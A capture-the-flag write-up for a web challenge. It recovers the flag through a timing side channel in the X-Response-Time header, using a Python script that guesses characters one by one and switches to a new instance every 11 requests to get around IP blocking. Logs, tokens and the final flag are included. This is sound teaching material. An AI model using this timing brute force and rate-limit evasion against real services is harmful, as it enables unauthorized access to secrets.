## Chall description
```
Category: Web

We've decided to make this challenge really straight forward. All you have to do is find out the flag!
Juuuust make sure not to trip any of the security controls implemented to stop brute force attacks...
```

Checking every section in this challenge, I tried `sqli/nosqli/blind sqli/etc` but didn’t find anything. After a while, I saw the header `X-Response-Time` for every http response, I remembered a CTF challenge that used a `timing` attack. The main idea is that when the Flag Checker verifies our submitted flag, it compares it char by char, and each correct character adds a small delay `0.1000+ milliseconds`, but it’s most likely 0.1000 seconds. This becomes noticeable when using two or more characters. For example, if we submit `flag1x` and `flag{x`, each correct character adds about 0.100 seconds. So, if `flag1x` takes around 0.400 seconds, that means the first 4 characters are correct, but the 5th character `1` is wrong. Meanwhile, if `flag{x` takes about 0.500 seconds, it means the first 5 characters are correct. That extra +0.100 second per correct character helps us identify the right one, allowing us to recover the flag char by char.

<img width="765" height="229" alt="Screenshot 2025-10-09 at 2 58 04 PM" src="https://github.com/user-attachments/assets/a107ac62-00f0-4361-8d1e-2b0e04c957ff" />

```html
#### flag1x
HTTP/2 200 OK
Date: Thu, 09 Oct 2025 20:56:52 GMT
Content-Type: text/html; charset=utf-8
Server: nginx/1.24.0 (Ubuntu)
X-Response-Time: 0.401433
Access-Control-Allow-Origin: *
```

```html
#### flag{x
HTTP/2 200 OK
Date: Thu, 09 Oct 2025 20:56:53 GMT
Content-Type: text/html; charset=utf-8
Server: nginx/1.24.0 (Ubuntu)
X-Response-Time: 0.501856
Access-Control-Allow-Origin: *
```

Now the main problem is the bruteforce protection, after try with time delay for every submitted char, I got blocked after 11 requests. Now we have to reset the machine after sent 11 requests 🫠 (Yeah, was the only way i found, since my VPN not work)

```html
HTTP/2 200 OK
Date: Thu, 09 Oct 2025 20:56:53 GMT
Content-Type: text/html; charset=utf-8
Server: nginx/1.24.0 (Ubuntu)
X-Response-Time: 0.000099
Access-Control-Allow-Origin: *

<html><body><h2>Stop Hacking!! Your IP has been blocked.</h2></body></html>
```

I wrote this python script to recover the flag.

```python
import requests

target_url = ""
Token = ""

def set_values():
    global target_url, Token
    target_url = input("Set instance url: ")
    Token = input("Set Token: ")

def send_new_request(x):
    headers = {
	        "Cookie":f"token={Token}"
        }

    url = target_url + x
    print(url)
    res = requests.get(url,headers=headers)
    return float(res.headers['X-Response-Time'])
    

flag = "flag{"
chars=['1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','0']

while len(flag)<38:
    print(flag+'}')
    detected = ""
    best_time = 0
    set_values()
    for num,x in enumerate(chars):
        if num == 10:
            print("Only 11 requests allowd by intance, please set new intance")
            set_values()
        values = "submit?flag="+flag+x+"}"
        req_time = send_new_request(values)
        print(x,req_time)
        if req_time > best_time:
            best_time = req_time
            detected = x

    flag +=detected
    print("Char detected:",detected)

print("Flag:",flag+'}')
```

```bash
flag{77}
Set instance url: https://7f4ddc1d.proxy.coursestack.com/
Set Token: 7f4ddc1d-4ca5-4569-b0ae-44fe52311b96_1_ad33e3730f6f634585614013368be2a6bf4a1128b7eb7d0d9fb430d1f3d05477
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{771}
1 0.702607
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{772}
2 0.702175
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{773}
3 0.702046
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{774}
4 0.702036
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{775}
5 0.702202
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{776}
6 0.702595
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{777}
7 0.702289
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{778}
8 0.701959
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{779}
9 0.701955
https://7f4ddc1d.proxy.coursestack.com/submit?flag=flag{77a}
a 0.702035
Only 11 requests allowd by intance, please set new intance
Set instance url: https://e0673fc9.proxy.coursestack.com/
Set Token: e0673fc9-71ba-4b5e-89cd-e45423924f2e_1_8dfb4f31609b36702473ca8603d3019195a6ad6ff0f8b6ceff5d7579e7b81435
https://e0673fc9.proxy.coursestack.com/submit?flag=flag{77b}
b 0.802738
https://e0673fc9.proxy.coursestack.com/submit?flag=flag{77c}
c 0.702858
https://e0673fc9.proxy.coursestack.com/submit?flag=flag{77d}
d 0.702231
https://e0673fc9.proxy.coursestack.com/submit?flag=flag{77e}
e 0.703375
https://e0673fc9.proxy.coursestack.com/submit?flag=flag{77f}
f 0.702607
https://e0673fc9.proxy.coursestack.com/submit?flag=flag{770}
0 0.702091
Char detected: b
flag{77b}
Set instance url: 
... snip ...
```

<img width="301" height="165" alt="Screenshot 2025-10-09 at 2 51 51 PM" src="https://github.com/user-attachments/assets/505524e6-29b9-46fb-8be2-c8eea15ae3f4" />


```bash
... snip ...
flag{77ba0346d9565e77344b9fe40ecf136}
Set instance url: https://a3a70259.proxy.coursestack.com/
Set Token: a3a70259-9310-4e60-a07d-6ab9ddc6d68b_1_0e5aff4d85f899c62676f0e9c280818c1e5f8b836356e70c7d8a81bd236c881d
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1361}
1 3.606378
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1362}
2 3.605825
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1363}
3 3.605994
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1364}
4 3.605945
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1365}
5 3.605815
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1366}
6 3.605923
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1367}
7 3.605889
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1368}
8 3.605865
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1369}
9 3.806388
https://a3a70259.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf136a}
a 3.605792
Only 11 requests allowd by intance, please set new intance
Set instance url: https://3cc7f070.proxy.coursestack.com/
Set Token: 3cc7f070-7dbb-419e-a119-5c293deb5740_1_296fd98788205418c8c36cbb76b4f371b8ecab165ea4d49d5f488efe1d62c9bf
https://3cc7f070.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf136b}
b 3.605827
https://3cc7f070.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf136c}
c 3.605836
https://3cc7f070.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf136d}
d 3.60568
https://3cc7f070.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf136e}
e 3.605921
https://3cc7f070.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf136f}
f 3.606007
https://3cc7f070.proxy.coursestack.com/submit?flag=flag{77ba0346d9565e77344b9fe40ecf1360}
0 3.606628
Char detected: 9
flag{77ba0346d9565e77344b9fe40ecf1369}
Flag: flag{77ba0346d9565e77344b9fe40ecf1369}
```


Flag: `flag{77ba0346d9565e77344b9fe40ecf1369}`

